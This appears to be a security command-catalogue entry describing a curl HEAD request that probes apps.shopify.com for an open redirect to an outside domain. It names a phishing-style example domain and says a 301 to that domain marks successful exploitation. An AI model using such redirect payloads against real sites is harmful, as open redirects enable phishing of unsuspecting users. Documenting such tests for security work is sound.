---
id: cmd-curl-shopify-redirect-test
data: 'curl -I https://apps.shopify.com//blackfan.ru/'
tags:
  - testing
  - redirect
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:31.180Z'
verified: false
validated: true
submitted: true
---
# curl-shopify-redirect-test

## Command

```bash
curl -I https://apps.shopify.com//blackfan.ru/
```

## Description

This command uses curl to send a HEAD request to a malformed Shopify apps URL, testing for the open redirect vulnerability by checking the response headers for a 301 redirect to the arbitrary domain.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-I, --head` | Fetch headers only, no body | Yes |
| `URL` | The target malformed URL (e.g., https://apps.shopify.com//arbitrary-domain.com/) | Yes |

## Examples

### Basic Usage

```bash
curl -I https://apps.shopify.com//blackfan.ru/
```

### Advanced Usage

```bash
curl -I -v https://apps.shopify.com//example-phish.com/  # Verbose output for debugging
```

## Expected Output

HTTP/1.1 301 Moved Permanently
Location: //blackfan.ru
Server: Cowboy
... (other headers)

A 301 status and Location header pointing to the relative protocol domain indicate successful exploitation.

## Related

- [[Related Procedure|procedures/Trigger-Shopify-Apps-Open-Redirect]]
